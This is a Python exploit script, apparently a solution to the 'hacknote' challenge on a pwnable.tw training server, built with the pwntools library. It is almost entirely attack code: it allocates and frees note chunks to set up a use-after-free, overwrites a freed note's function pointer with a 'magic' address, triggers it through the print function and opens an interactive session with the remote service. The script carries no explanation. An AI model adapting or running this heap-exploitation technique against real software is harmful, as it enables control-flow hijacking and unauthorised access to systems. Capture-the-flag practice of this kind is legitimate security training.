#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "training.pwnable.tw"
port = 11010

r = remote(host,port)

def addnote(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

magic = 0x08048986
system = 0x8048506
addnote(32,"ddaa")
addnote(32,"ddaa")
addnote(32,"ddaa")
delnote(0)
delnote(1)
addnote(8,p32(magic))
printnote(0)
r.interactive()
